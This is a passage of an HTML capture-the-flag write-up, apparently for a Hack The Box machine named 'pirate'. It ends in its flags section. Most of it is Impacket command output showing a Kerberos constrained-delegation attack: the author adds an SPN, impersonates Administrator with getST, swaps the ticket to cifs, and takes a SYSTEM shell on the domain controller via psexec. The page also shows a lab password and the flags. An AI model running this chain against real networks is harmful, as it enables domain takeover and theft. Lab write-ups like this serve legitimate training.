+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HOST/WEB01 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RestrictedKrbHost/WEB01 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TERMSRV/WEB01.pirate.htb <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TERMSRV/WEB01 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTTP/WEB01 <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTTP/WEB01.pirate.htb <br>
+            <br>
+            [+] SPN Modified successfully <br>
+            (venv) k0d14k@kpb:~/Documenti/pirate/root/krbrelayx$ findDelegation.py -user 'a.white_adm' 'pirate.htb/a.white_adm:Password123!' <br>
+            Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies  <br>
+            <br>
+            AccountName&nbsp;&nbsp;AccountType&nbsp;&nbsp;DelegationType&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DelegationRightsTo&nbsp;&nbsp;&nbsp;&nbsp; SPN Exists  <br>
+            -----------&nbsp;&nbsp;-----------&nbsp;&nbsp;----------------------------------&nbsp;&nbsp;---------------------&nbsp;&nbsp;---------- <br>
+            a.white_adm&nbsp;&nbsp;Person&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Constrained w/ Protocol Transition&nbsp;&nbsp;http/WEB01.pirate.htb&nbsp;&nbsp;No&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  <br>
+            a.white_adm&nbsp;&nbsp;Person&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Constrained w/ Protocol Transition&nbsp;&nbsp;HTTP/WEB01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; No&nbsp;&nbsp;
+         </div>
+
+         <p>Next, we create the new SPN on the Domain Controller using the `WriteSPN` privileges:</p>
+
+         <div class="code">
+            (venv) k0d14k@kpb:~/Documenti/pirate/root/krbrelayx$ python3 addspn.py -t 'DC01$' -u "pirate.htb\a.white_adm" -p "Password123!" 'DC01.pirate.htb' --spn "http/WEB01.pirate.htb" <br>
+            [-] Connecting to host... <br>
+            [-] Binding to host <br>
+            [+] Bind OK <br>
+            [+] Found modification target <br>
+            [+] SPN Modified successfully <br>
+            (venv) k0d14k@kpb:~/Documenti/pirate/root/krbrelayx$ findDelegation.py -user 'a.white_adm' 'pirate.htb/a.white_adm:Password123!' <br>
+            Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies&nbsp;&nbsp;<br>
+            <br>
+            AccountName&nbsp;&nbsp;AccountType&nbsp;&nbsp;DelegationType&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DelegationRightsTo&nbsp;&nbsp;&nbsp;&nbsp; SPN Exists&nbsp;&nbsp;<br>
+            -----------&nbsp;&nbsp;-----------&nbsp;&nbsp;----------------------------------&nbsp;&nbsp;---------------------&nbsp;&nbsp;---------- <br>
+            a.white_adm&nbsp;&nbsp;Person&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Constrained w/ Protocol Transition&nbsp;&nbsp;http/WEB01.pirate.htb&nbsp;&nbsp;Yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+            a.white_adm&nbsp;&nbsp;Person&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Constrained w/ Protocol Transition&nbsp;&nbsp;HTTP/WEB01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; No 
+         </div>
+
+         <p>Now that we have our new SPN available on the DC, we can request a ticket for Administrator:</p>
+
+         <div class="code">
+            (venv) k0d14k@kpb:~/Documenti/pirate/root/krbrelayx$ getST.py -spn "http/WEB01.pirate.htb" -impersonate "Administrator" 'pirate.htb/a.white_adm:Password123!' <br>
+            Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies  <br>
+            <br>
+            [-] CCache file is not found. Skipping... <br>
+            [*] Getting TGT for user <br>
+            [*] Impersonating Administrator <br>
+            [*] Requesting S4U2self <br>
+            [*] Requesting S4U2Proxy <br>
+            [*] Saving ticket in Administrator@http_WEB01.pirate.htb@PIRATE.HTB.ccache
+         </div>
+
+         <p>Now we just need to modify the `http` SPN ticket into a `cifs` one that allows shell access:</p>
+
+         <div class="code">
+            (venv) k0d14k@kpb:~/Documenti/pirate/root$ python3 tgssub.py -in Administrator@http_WEB01.pirate.htb@PIRATE.HTB.ccache -out newticket.ccache -altservice "cifs/DC01.pirate.htb" <br>
+            Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies  <br>
+            <br>
+            [*] Number of credentials in cache: 1 <br>
+            [*] Changing service from http/WEB01.pirate.htb@PIRATE.HTB to cifs/DC01.pirate.htb@PIRATE.HTB <br>
+            [*] Saving ticket in newticket.ccache <br>
+            (venv) k0d14k@kpb:~/Documenti/pirate/root$ export KRB5CCNAME=newticket.ccache  <br>
+            (venv) k0d14k@kpb:~/Documenti/pirate/root$ psexec.py -k -no-pass DC01.pirate.htb <br>
+            Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies  <br>
+            <br>
+            [*] Requesting shares on DC01.pirate.htb..... <br>
+            [*] Found writable share ADMIN$ <br>
+            [*] Uploading file AfLKEGKO.exe <br>
+            [*] Opening SVCManager on DC01.pirate.htb..... <br>
+            [*] Creating service Indy on DC01.pirate.htb..... <br>
+            [*] Starting service Indy..... <br>
+            [!] Press help for extra shell commands <br>
+            Microsoft Windows [Version 10.0.17763.8385] <br>
+            (c) 2018 Microsoft Corporation. All rights reserved. <br>
+            <br>
+            C:\Windows\system32> whoami <br>
+            nt authority\system <br>
+            <br>
+            C:\Windows\system32> hostname <br>
+            DC01 <br>
+            <br>
+            C:\Windows\system32> cd C:\Users\Administrator\Desktop <br>
+            <br>
+            C:\Users\Administrator\Desktop> type root.txt <br>
+            f8a93a493041890dc661725dc0700c78 <br>
+            <br>
+            C:\Users\Administrator\Desktop> 
+         </div>
+      </section>
+
+      <section id="flags">
+         <h2>cat flags</h2>
+         <h3><b>User Flag:</b> 107e23f1ae73d48fa400a6a38664e4da</h3>
+         <h3><b>Root Flag:</b> f8a93a493041890dc661725dc0700c78</h3>
+      </section>
+   </main>
+
+
+   <footer>
+      <p>Built with GitHub Pages —— Securing the web, one bug at a time.</p>
+      <p>&copy; 2025 K0D14K</p>
+   </footer>
+
+   <script src="/static/script.js"></script>
+   <script> lister() </script>
+</body>
